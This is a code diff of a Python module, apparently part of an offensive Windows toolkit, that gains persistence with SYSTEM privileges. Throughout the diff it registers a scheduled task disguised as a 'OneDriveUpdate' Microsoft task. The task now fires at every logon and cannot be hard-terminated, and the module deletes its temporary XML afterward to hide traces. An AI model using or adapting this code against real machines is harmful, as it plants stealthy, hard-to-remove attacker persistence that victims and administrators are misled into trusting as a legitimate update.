@@ -1,11 +1,19 @@
 import os
-import wmi
 import time
 import tempfile
-import ctypes
 from core.prints import *
+from core.utils import *
 
-wmi = wmi.WMI()
+schtask_info = {
+        "Description": "Gain persistence with system privilege using schtasks",
+		"Id" : "17",
+		"Type" : "Persistence",	
+		"Fixed In" : "99999",
+		"Works From" : "7600",
+		"Admin" : True,
+		"Function Name" : "schtask",
+		"Function Payload" : True,
+    }
 
 def schtask(payload):
 	xml_template = """<?xml version="1.0" encoding="UTF-16"?>
@@ -15,7 +23,11 @@ def schtask(payload):
     <Author>000000000000000000</Author>
     <URI>\Microsoft\Windows\OneDriveUpdate</URI>
   </RegistrationInfo>
-  <Triggers />
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+  </Triggers>
   <Principals>
     <Principal id="Author">
       <UserId>S-1-5-18</UserId>
@@ -26,7 +38,7 @@ def schtask(payload):
     <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
     <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
+    <AllowHardTerminate>false</AllowHardTerminate>
     <StartWhenAvailable>true</StartWhenAvailable>
     <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
     <IdleSettings>
@@ -52,8 +64,7 @@ def schtask(payload):
   </Actions>
 </Task>"""
 
-	print_info("Payload {}".format(payload))
-	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
+	if (information().admin() == True):
 		try:
 			xml_file = open(os.path.join(tempfile.gettempdir(),"elevator.xml"),"w")
 			xml_file.write(xml_template)
@@ -63,31 +74,22 @@ def schtask(payload):
 	
 		time.sleep(5)
 	
-		print_info("Attempting to create persistent schtask with SYSTEM privledges")
 		if (os.path.isfile(os.path.join(tempfile.gettempdir(),"elevator.xml")) == True):
-			create = wmi.Win32_Process.Create(CommandLine="schtasks /create /xml {} /tn OneDriveUpdate".format(os.path.join(tempfile.gettempdir(),"elevator.xml")),
-								ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
-			
-			if (create[1] == 0):
-				print_success("Successfully created schtask")
-				run = wmi.Win32_Process.Create(CommandLine="schtasks /run /tn OneDriveUpdate",
-								ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
-				
-				print_info("Pausing for 5 seconds before running schtask")
-				time.sleep(5)
-				
-				if (run[1] == 0):
-					print_success("Successfully ran schtask")
-					try:
-						os.remove(os.path.join(tempfile.gettempdir(),"elevator.xml"))
-					except Exception as error:
-						return False
-				else:
-					print_error("Unable to run schtask")													
+			if process().create("schtasks /create /xml {} /tn OneDriveUpdate".format(os.path.join(tempfile.gettempdir(),"elevator.xml")),0) == True:
+				print_success("Successfully created scheduled task, payload will run at login")
 			else:
-				print_error("Unable to create schtask")
-			
+				print_error("Unable to create scheduled task")	
+				return False
+				
+			time.sleep(5)
+
+			try:
+				os.remove(os.path.join(tempfile.gettempdir(),"elevator.xml"))
+			except Exception as error:
+				return False
 		else:
-			print_error("Unable to create schtask, xml template not found")
+			print_error("Unable to create scheduled task, xml file not found")
+			return False
 	else:
-		print_error("Unable to create schtask, we are not elevated")
+		print_error("Cannot proceed, we are not elevated")
+		return False
